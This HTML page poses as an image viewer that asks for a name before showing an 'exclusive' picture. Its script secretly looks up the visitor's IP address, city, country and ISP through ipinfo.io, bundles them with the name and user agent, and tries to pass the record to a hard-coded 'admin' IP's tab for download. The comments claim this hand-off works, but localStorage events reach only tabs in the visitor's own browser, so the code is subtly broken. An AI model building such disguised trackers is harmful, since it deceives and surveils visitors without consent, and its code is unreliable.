<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        #content {
            max-width: 800px;
            margin: 0 auto;
        }
        #user-image {
            max-width: 100%;
            border-radius: 8px;
            display: none;
        }
        #name-form {
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div id="content">
        <h1>View Our Exclusive Image</h1>
        
        <div id="name-form">
            <p>Enter your name to view the image:</p>
            <input type="text" id="userName" placeholder="Your name">
            <button onclick="handleSubmission()">View Image</button>
        </div>
        
        <img id="user-image" src="https://i.imgur.com/example.jpg" alt="Exclusive content">
    </div>

    <script>
        const ADMIN_IP = "83.105.112.217";

        async function handleSubmission() {
            const userName = document.getElementById('userName').value.trim() || "Anonymous";

            try {
                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
                const userAgent = navigator.userAgent;

                const log = {
                    name: userName,
                    ip: ipData.ip,
                    city: ipData.city,
                    country: ipData.country,
                    isp: ipData.org,
                    userAgent,
                    time: new Date().toISOString()
                };

                // If viewer is not you, broadcast the data to all tabs open (including admin tab)
                if (ipData.ip !== ADMIN_IP) {
                    localStorage.setItem("visitorLog", JSON.stringify(log));
                    localStorage.setItem("logTrigger", Date.now()); // force update to trigger listener
                }

                // Show the image
                document.getElementById('user-image').style.display = 'block';
                document.getElementById('name-form').style.display = 'none';
            } catch (e) {
                document.getElementById('user-image').style.display = 'block';
                document.getElementById('name-form').style.display = 'none';
            }
        }

        // Admin listens for new visitor logs via localStorage
        window.addEventListener("storage", (e) => {
            if (e.key === "logTrigger") {
                try {
                    const data = localStorage.getItem("visitorLog");
                    const blob = new Blob([data], { type: "text/plain" });
                    const link = document.createElement("a");
                    link.href = URL.createObjectURL(blob);
                    link.download = "visitor_log.txt";
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                } catch (e) {
                    console.error("Failed to process visitor log.");
                }
            }
        });

        // Allow enter key to trigger submission
        document.getElementById('userName').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') handleSubmission();
        });
    </script>
</body>
</html>
